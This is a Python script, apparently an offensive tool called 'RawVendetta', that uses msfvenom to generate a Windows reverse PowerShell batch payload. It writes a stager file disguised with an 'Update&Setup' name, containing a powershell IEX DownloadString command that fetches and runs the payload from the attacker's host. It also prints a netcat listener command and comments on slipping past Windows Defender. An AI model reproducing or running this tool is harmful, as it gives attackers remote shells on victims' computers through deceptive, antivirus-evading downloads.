import os

run = os.system
ru2 = os.popen
txtgreen = '\033[32m'
txtred = '\033[31m'
txtgreen = '\033[32m'
txtyellow = '\033[33m'
txtwhite = '\033[37m'
txtcyan = '\033[36m'

def main():
	print(txtgreen + '''

________        .__        __   __________         __    
\_____  \  __ __|__| ____ |  | _\______   \_____ _/  |_  
 /  / \  \|  |  \  |/ ___\|  |/ /|    |  _/\__  \|   __\ 
/   \_/.  \  |  /  \  \___|    < |    |   \ / __ \|  |   
\_____\ \_/____/|__|\___  >__|_ \|______  /(____  /__|   
       \__>             \/     \/       \/      \/       
                {}RawVendetta -Version1.3{}                  
'''.format(txtyellow, txtwhite) + txtwhite)
	context = os.popen('ip r').read()
	initdata = context.split('src ', 1)
	updata = initdata[1].split(' metric')
	lhost = updata[0]
	print('lhost:', lhost)
	lport = str(input('Enter Port To Listen On:'))
	bname = str(input('Name of file(.bat):'))
	batchname = bname + '.bat'
	stagername = bname + 'Update&Setup'
	stagerfname = stagername + '.bat'
	command = 'msfvenom -p cmd/windows/reverse_powershell lhost=' + lhost + ' lport=' + lport + ' > ' + bname + '.bat'
	askps = 'nc -lvp ' + lport
	run(command)
	print(txtgreen + '\nGenerating File...\n' + txtwhite)
	print(txtgreen + 'File Created: ' + bname + '.bat\nHost ' + lhost + ' is listening on: ' + lport + '\n' + txtyellow + '\nTo connect to a remote machine, that machine needs to run the following:\npowershell -c "IEX((New-Object System.Net.WebClient).DownloadString(\'http://'+ lhost + '/' + bname + '.bat\'))\n\nThe above command will have their machine download the files and run it from their computer assuming you are hosting the server there.\n' + txtwhite)
	print(txtyellow + '!!!' + txtwhite + 'Run "' + askps + '" to listen for a connection' + txtyellow + '!!!\n' + txtwhite)
	print(txtgreen + 'Generating stager: ' + stagerfname + txtwhite)
	file1 = open(stagerfname, 'x')
	file1.close()
	makestager = open(stagerfname, 'a')
	makestager.write('powershell -c "IEX((New-Object System.Net.WebClient).DownloadString(\'http://' + lhost + '/' + batchname + '\'))')
	makestager.close()
	readstager = open(stagerfname, 'r')
	print('Wrote the following payload to stager named:' + stagername + '\ncontaining the following string:\n' + readstager.read())
	readstager.close()
	print('\nThe client needs to download and execute the stager:' + stagerfname + ' and reverse shell:' + bname)
	print(txtyellow + '\nAdditional Info:\nRunning the stager will download the batch reverse shell on the remote machine.\nYou can run the batch reverse shell standalone, but its not very likely to bypass windows defender this way unless downloaded and installed to a protected folder on a windows operating system.' + txtwhite)
main()
